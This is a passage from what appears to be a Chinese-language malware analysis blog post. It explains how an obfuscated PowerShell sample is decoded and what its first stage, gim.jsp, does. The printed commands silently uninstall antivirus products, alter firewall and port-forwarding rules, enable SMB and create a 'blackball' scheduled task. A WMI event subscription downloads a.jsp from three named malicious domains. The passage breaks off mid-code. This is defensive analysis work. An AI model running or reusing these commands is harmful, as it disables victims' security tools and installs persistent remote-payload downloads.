</div></div><div class="ec-line"><div class="code"><span style="--0:#C98A7D;--1:#B56959">echo $de > .\decoded_2.txt</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$de=$((&#x27; ( ((tfUcm&#x27;+&#x27;d /c start........[CHaR]39  -ReplaCE  &#x27;hCN&#x27;,[CHaR]36)| &#x26;( $pShOMe[21]+$PSHOme[34]+&#x27;x&#x27;)echo $de > .\decoded_2.txt"><div></div></button></div></figure></div>
<p>重复这个流程 直到只剩下可读明文代码</p>
<h2 id="核心样本分析">核心样本分析<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 核心样本分析" data-pagefind-ignore="" href="#核心样本分析">#</a></h2>
<h3 id="gimjsp攻击的初始入口"><code>gim.jsp</code>：攻击的初始入口<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to gim.jsp：攻击的初始入口" data-pagefind-ignore="" href="#gimjsp攻击的初始入口">#</a></h3>
<p>核心作用是「扫清障碍 + 拉取第二阶段脚本」：此阶段载荷主要负责在 Windows 环境下建立长效驻留。</p>
<ul>
<li><strong>防御突破</strong>：卸载主流杀软（Eset、Kaspersky等），配置防火墙（转发 / 阻断规则），启用 SMB（为后续横向扩散铺路）；</li>
</ul>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash"><code><div class="ec-line"><div class="code"><span style="--0:#758575DD;--1:#A0ADA0">#卸载主流杀软（Eset、Kaspersky等）</span></div></div><div class="ec-line"><div class="code"><span style="--0:#80A665;--1:#59873A">cmd</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/c</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">start</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/b</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">wmic.exe</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">product</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">where</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">name like '%Eset%'</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">call</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">uninstall</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/nointeractive</span></div></div><div class="ec-line"><div class="code"><span style="--0:#80A665;--1:#59873A">cmd</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/c</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">start</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/b</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">wmic.exe</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">product</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">where</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">name like '%%Kaspersky%%'</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">call</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">uninstall</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/nointeractive</span></div></div><div class="ec-line"><div class="code"><span style="--0:#80A665;--1:#59873A">cmd</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/c</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">start</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/b</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">wmic.exe</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">product</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">where</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">name like '%avast%'</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">call</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">uninstall</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/nointeractive</span></div></div><div class="ec-line"><div class="code"><span style="--0:#80A665;--1:#59873A">cmd</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/c</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">start</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/b</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">wmic.exe</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">product</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">where</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">name like '%avp%'</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">call</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">uninstall</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/nointeractive</span></div></div><div class="ec-line"><div class="code"><span style="--0:#80A665;--1:#59873A">cmd</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/c</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">start</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/b</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">wmic.exe</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">product</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">where</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">name like '%Security%'</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">call</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">uninstall</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/nointeractive</span></div></div><div class="ec-line"><div class="code"><span style="--0:#80A665;--1:#59873A">cmd</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/c</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">start</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/b</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">wmic.exe</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">product</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">where</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">name like '%AntiVirus%'</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">call</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">uninstall</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/nointeractive</span></div></div><div class="ec-line"><div class="code"><span style="--0:#80A665;--1:#59873A">cmd</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/c</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">start</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/b</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">wmic.exe</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">product</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">where</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">name like '%Norton Security%'</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">call</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">uninstall</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/nointeractive</span></div></div><div class="ec-line"><div class="code"><span style="--0:#80A665;--1:#59873A">cmd</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/c</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">C:\Progra~1\Malwarebytes\Anti-Malware\unins000.exe</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/verysilent</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/suppressmsgboxes</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/norestart</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#758575DD;--1:#A0ADA0">#配置防火墙（转发 / 阻断规则）</span></div></div><div class="ec-line"><div class="code"><span style="--0:#80A665;--1:#59873A">cmd.exe</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/c</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">netsh.exe</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">firewall</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">add</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">portopening</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">tcp</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">65529</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">SDNSd</span></div></div><div class="ec-line"><div class="code"><span style="--0:#80A665;--1:#59873A">netsh.exe</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">interface</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">portproxy</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">add</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">v4tov4</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">listenport=</span><span style="--0:#4C9A91;--1:#2F798A">65529</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">connectaddress=</span><span style="--0:#4C9A91;--1:#2F798A">1.1.1.1</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">connectport=</span><span style="--0:#4C9A91;--1:#2F798A">53</span></div></div><div class="ec-line"><div class="code"><span style="--0:#80A665;--1:#59873A">netsh</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">advfirewall</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">firewall</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">add</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">rule</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">name=</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">deny445</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">dir=in</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">protocol=tcp</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">localport=</span><span style="--0:#4C9A91;--1:#2F798A">445</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">action=block</span></div></div><div class="ec-line"><div class="code"><span style="--0:#80A665;--1:#59873A">netsh</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">advfirewall</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">firewall</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">add</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">rule</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">name=</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">deny135</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">dir=in</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">protocol=tcp</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">localport=</span><span style="--0:#4C9A91;--1:#2F798A">135</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">action=block</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#758575DD;--1:#A0ADA0">#启用 SMB（为后续横向扩散铺路）</span></div></div><div class="ec-line"><div class="code"><span style="--0:#80A665;--1:#59873A">Set-ItemProperty</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C99076;--1:#A65E2B">-Path</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">DisableCompression</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C99076;--1:#A65E2B">-Type</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">DWORD</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C99076;--1:#A65E2B">-Value</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">???Force</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="cmd /c start /b wmic.exe product where &#x22;name like &#x27;%Eset%&#x27;&#x22; call uninstall /nointeractivecmd /c start /b wmic.exe product where &#x22;name like &#x27;%%Kaspersky%%&#x27;&#x22; call uninstall /nointeractivecmd /c start /b wmic.exe product where &#x22;name like &#x27;%avast%&#x27;&#x22; call uninstall /nointeractivecmd /c start /b wmic.exe product where &#x22;name like &#x27;%avp%&#x27;&#x22; call uninstall /nointeractivecmd /c start /b wmic.exe product where &#x22;name like &#x27;%Security%&#x27;&#x22; call uninstall /nointeractivecmd /c start /b wmic.exe product where &#x22;name like &#x27;%AntiVirus%&#x27;&#x22; call uninstall /nointeractivecmd /c start /b wmic.exe product where &#x22;name like &#x27;%Norton Security%&#x27;&#x22; call uninstall /nointeractivecmd /c &#x22;C:\Progra~1\Malwarebytes\Anti-Malware\unins000.exe&#x22; /verysilent /suppressmsgboxes /norestartcmd.exe /c netsh.exe firewall add portopening tcp 65529 SDNSdnetsh.exe interface portproxy add v4tov4 listenport=65529 connectaddress=1.1.1.1 connectport=53netsh advfirewall firewall add rule name=&#x22;deny445&#x22; dir=in protocol=tcp localport=445 action=blocknetsh advfirewall firewall add rule name=&#x22;deny135&#x22; dir=in protocol=tcp localport=135 action=blockSet-ItemProperty -Path &#x22;HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters&#x22; DisableCompression -Type DWORD -Value 1 ???Force"><div></div></button></div></figure></div>
<ul>
<li><strong>权限检测</strong>：验证当前用户是否为 administrator，是则创建计划任务blackball（持久化）；</li>
</ul>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash"><code><div class="ec-line"><div class="code"><span style="--0:#BD976A;--1:#B07D48">$sa</span><span style="--0:#DBD7CAEE;--1:#393A34">=(</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#DBD7CAEE;--1:#393A34">Security.Principal.WindowsPrincipal</span><span style="--0:#666666;--1:#999999">][</span><span style="--0:#DBD7CAEE;--1:#393A34">Security.Principal.WindowsIdentity</span><span style="--0:#666666;--1:#999999">]</span><span style="--0:#80A665;--1:#59873A">::GetCurrent</span><span style="--0:#666666;--1:#999999">()</span><span style="--0:#DBD7CAEE;--1:#393A34">).IsInRole(</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#DBD7CAEE;--1:#393A34">Security.Principal.WindowsBuiltInRole</span><span style="--0:#666666;--1:#999999">]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">Administrator</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34">)</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#DBD7CAEE;--1:#393A34">if(</span><span style="--0:#BD976A;--1:#B07D48">$sa</span><span style="--0:#DBD7CAEE;--1:#393A34">)</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#DBD7CAEE;--1:#393A34">  </span></span><span style="--0:#DBD7CAEE;--1:#393A34">{</span><span style="--0:#80A665;--1:#59873A">schtasks</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/create</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/ru</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">system</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/sc</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">MINUTE</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/mo</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">120</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/tn</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">blackball</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/F</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/tr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">blackball</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">  </span><span style="--0:#4D9375;--1:#1E754F">else</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#DBD7CAEE;--1:#393A34">  </span></span><span style="--0:#DBD7CAEE;--1:#393A34">{</span><span style="--0:#80A665;--1:#59873A">schtasks</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/create</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/sc</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">MINUTE</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/mo</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">120</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/tn</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">blackball</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/F</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">/tr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">blackball</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$sa=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] &#x22;Administrator&#x22;)if($sa)  {schtasks /create /ru system /sc MINUTE /mo 120 /tn blackball /F /tr &#x22;blackball&#x22;}  else  {schtasks /create /sc MINUTE /mo 120 /tn blackball /F /tr &#x22;blackball&#x22;}"><div></div></button></div></figure></div>
<ul>
<li><strong>脚本拉取</strong>：从 3 个备用域名（t.zz3r0.com等）下载 a.jsp 并改名 aa.jsp，下载后会触发「校验机制」（长度≥173→解密前 173 字符→SHA1 校验，校验通过才执行）。</li>
</ul>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash"><code><div class="ec-line"><div class="code"><span style="--0:#758575DD;--1:#A0ADA0">#针对 3 个指定的恶意域名（t.zz3r0.com等）,通过 WMI 事件订阅创建每小时触发一次的隐蔽执行规则,下载 a.jsp 并改名 aa.jsp,实现持久化、无界面运行。</span></div></div><div class="ec-line"><div class="code"><span style="--0:#BD976A;--1:#B07D48">$us</span><span style="--0:#DBD7CAEE;--1:#393A34">=</span><span style="--0:#CB7676;--1:#AB5959">@</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#80A665;--1:#59873A">'t.zz3r0.com'</span><span style="--0:#80A665;--1:#59873A">,</span><span style="--0:#80A665;--1:#59873A">'t.zer9g.com'</span><span style="--0:#80A665;--1:#59873A">,</span><span style="--0:#80A665;--1:#59873A">'t.amynx.com'</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#DBD7CAEE;--1:#393A34">foreach(</span><span style="--0:#BD976A;--1:#B07D48">$u</span><span style="--0:#DBD7CAEE;--1:#393A34"> in </span><span style="--0:#BD976A;--1:#B07D48">$us</span><span style="--0:#DBD7CAEE;--1:#393A34">){</span></div></div><div class="ec-line"><div class="code"><span style="--0:#BD976A;--1:#B07D48">$theName</span><span style="--0:#C98A7D;--1:#B56959">=getRan</span></div></div><div class="ec-line"><div class="code"><span style="--0:#BD976A;--1:#B07D48">$wmicmd</span><span style="--0:#DBD7CAEE;--1:#393A34">=</span><span style="--0:#BD976A;--1:#B07D48">$tmps</span><span style="--0:#DBD7CAEE;--1:#393A34">.replace(</span><span style="--0:#80A665;--1:#59873A">'U1'</span><span style="--0:#80A665;--1:#59873A">,$u.substring(0,5</span><span style="--0:#DBD7CAEE;--1:#393A34">)).replace(</span><span style="--0:#80A665;--1:#59873A">'U2'</span><span style="--0:#80A665;--1:#59873A">,$u.substring(5</span><span style="--0:#DBD7CAEE;--1:#393A34">)).replace(</span><span style="--0:#80A665;--1:#59873A">'a.jsp'</span><span style="--0:#80A665;--1:#59873A">,</span><span style="--0:#80A665;--1:#59873A">'aa.jsp'</span><span style="--0:#DBD7CAEE;--1:#393A34">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#80A665;--1:#59873A">Set-WmiInstance</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C99076;--1:#A65E2B">-Class</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">__FilterToConsumerBinding</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C99076;--1:#A65E2B">-Namespace</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">root\subscription</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C99076;--1:#A65E2B">-Arguments</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">@{Filter=</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#80A665;--1:#59873A">Set-WmiInstance</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C99076;--1:#A65E2B">-Class</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">__EventFilter</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C99076;--1:#A65E2B">-NameSpace</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">root\subscription</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C99076;--1:#A65E2B">-Arguments</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">@{Name=</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">f</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">+</span><span style="--0:#BD976A;--1:#B07D48">$theName</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">EventNameSpace</span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">root\cimv2</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">QueryLanguage</span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">WQL</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span 